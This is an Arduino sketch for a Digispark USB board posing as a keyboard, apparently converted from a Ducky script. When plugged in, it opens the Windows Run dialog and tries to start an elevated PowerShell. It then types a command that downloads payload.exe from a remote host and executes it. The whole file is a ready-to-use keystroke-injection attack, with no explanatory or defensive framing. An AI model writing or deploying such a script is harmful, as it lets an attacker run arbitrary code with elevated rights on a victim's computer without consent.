#include "DigiKeyboard.h"

// Converted using https://naheel.xyz/ducky2digi

void loop() {}

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);
  // start of script
  // undefined
  // let the HID enumerate
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  // my best attempt at a elevated powershell instance
  DigiKeyboard.print(F("powershell Start-Process powershell -Verb runAs"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.print(F("$down = New-Object System.Net.Webclient; $url = 'http://192.168.100.150/payload.exe'; $file = 'payload.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}